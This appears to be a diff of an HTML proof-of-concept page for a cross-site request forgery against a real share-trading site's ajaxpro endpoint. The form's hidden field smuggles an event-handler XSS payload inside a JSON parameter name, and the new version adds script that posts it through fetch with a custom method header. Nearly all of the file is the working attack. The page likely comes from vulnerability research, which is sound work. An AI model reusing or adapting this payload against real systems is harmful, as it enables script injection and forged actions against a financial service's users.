@@ -1,23 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF PoC - HSBC Share Trading</title>
-    <meta name="referrer" content="unsafe-url">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
 </head>
 <body>
-    <h2>CSRF PoC</h2>
+<form
+    id='myForm'
+    action="https://www.sharetrading.hsbc.com.au/ajaxpro/TPP.Website.AJAX.AllAjax,TPP.Website.ashx"
+    method="POST"
+    enctype="application/x-www-form-urlencoded"
+    referrerpolicy="unsafe-url">
 
-    <form
-        action="https://www.sharetrading.hsbc.com.au/ajaxpro/TPP.Website.AJAX.AllAjax,TPP.Website.ashx"
-        method="POST"
-        enctype="text/plain"
-        referrerpolicy="unsafe-url">
+    <input type="hidden"
+        name='{"type":0,"typeID":"0 onmouseover=prompt(96096) y","areaField":0,"colorField":1,"width":0,"height":0,"groups":"","showControls":true,"x":"'
+        value='"}'>
 
-        <input type="hidden"
-            name='{"type":0,"typeID":"0 onmouseover=prompt(96096) y","areaField":0,"colorField":1,"width":0,"height":0,"groups":"","showControls":true,"x":"'
-            value='"}'>
+    <input type="submit" value="Execute CSRF">
+</form>
 
-        <input type="submit" value="Execute CSRF">
-    </form>
+<script>
+document.getElementById('myForm').addEventListener('submit', function(event) {
+    // 1. Stop the browser from doing the native, header-less form submission
+    event.preventDefault(); 
+
+    // 2. Automatically gather all the input data from the form
+    const formData = new FormData(this);
+    
+    // Convert FormData to URL-encoded format (standard form submission format)
+    const urlEncodedData = new URLSearchParams(formData);
+
+    // 3. Send the request to the third-party site with your custom header
+    fetch(this.action, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'text/plain',
+            'X-Ajaxpro-Method': 'GetTreeMap'
+        },
+        body: urlEncodedData
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Form successfully submitted with custom header!");
+            // Optional: Redirect the user manually if the third-party site expects it
+            // window.location.href = "https://different-site.com";
+        } else {
+            console.error("Submission failed.");
+        }
+    })
+    .catch(error => console.error("Error:", error));
+});
+</script>
 </body>
 </html>
